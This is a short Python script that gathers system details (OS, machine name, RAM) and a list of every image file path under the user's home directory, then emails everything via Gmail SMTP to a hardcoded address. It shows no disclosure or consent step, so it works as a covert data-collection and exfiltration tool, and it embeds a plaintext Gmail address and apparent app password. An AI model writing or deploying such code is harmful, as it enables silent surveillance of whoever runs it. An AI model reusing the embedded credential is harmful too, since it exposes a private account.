import os
import platform
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def get_system_info():
    uname = platform.uname()
    os_info = f"System: {uname.system}"
    os_info += f"\nNode Name: {uname.node}"
    os_info += f"\nRelease: {uname.release}"
    os_info += f"\nVersion: {uname.version}"
    os_info += f"\nMachine: {uname.machine}"
    os_info += f"\nProcessor: {uname.processor}"
    
    with open('/proc/meminfo') as mem:
        for line in mem:
            if line.startswith('MemTotal:'):
                total_memory = line.split()[1]
                os_info += f"\nTotal RAM: {total_memory} kB"
                break
    
    return os_info

def scan_image_files(directory):
    image_extensions = [".jpg", ".jpeg", ".png", ".gif", ".bmp"]  
    image_files = []
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            if any(file.lower().endswith(ext) for ext in image_extensions):
                image_files.append(os.path.join(root, file))
    
    if image_files:
        image_list = "\n\nImage files found:\n"
        for img_file in image_files:
            image_list += f"- {img_file}\n"
        return image_list
    else:
        return "\n\nNo image files found in the directory."


sender_email = "tirawatnantamas@gmail.com"  
receiver_email = "tirawatnantamas@gmail.com"  
password = "deiz davp nmxd yibc"  


message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = "System Information and Image Files"


os_info = get_system_info()


home_directory = os.path.expanduser("~")
image_files_info = scan_image_files(home_directory)


body = os_info + image_files_info


message.attach(MIMEText(body, "plain"))


try:
    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email, password)
        text = message.as_string()
        server.sendmail(sender_email, receiver_email, text)
    print("Email sent successfully!")
except Exception as e:
    print(f"Error sending email: {e}")
